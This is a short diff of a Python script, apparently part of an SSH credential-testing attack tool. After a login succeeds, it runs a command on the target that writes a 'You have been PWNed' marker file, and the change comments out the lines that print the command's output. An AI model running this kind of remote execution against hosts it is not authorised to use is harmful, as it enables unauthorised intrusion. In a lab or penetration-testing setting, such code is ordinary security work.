@@ -90,6 +90,8 @@ stdin, stdout, stderr = client.exec_command('python')
 stdin.write('open("tester.txt", "w").write("Congratulations! You have been PWNed :) ")')
 stdin.channel.shutdown_write()
 
+# Can un-comment following lines to see results from command ran on target system if valid credentials are found
+'''
 # Print output of command. Will wait for command to finish.
 if stdout:
     print(f'\nSTDOUT: {stdout.read().decode("utf8")}')
@@ -98,6 +100,7 @@ else:
 
 # Get return code from command (0 is default for success)
 print(f'Return code: {stdout.channel.recv_exit_status()}')
+'''
 
 # Because they are file objects,
 # they need to be closed
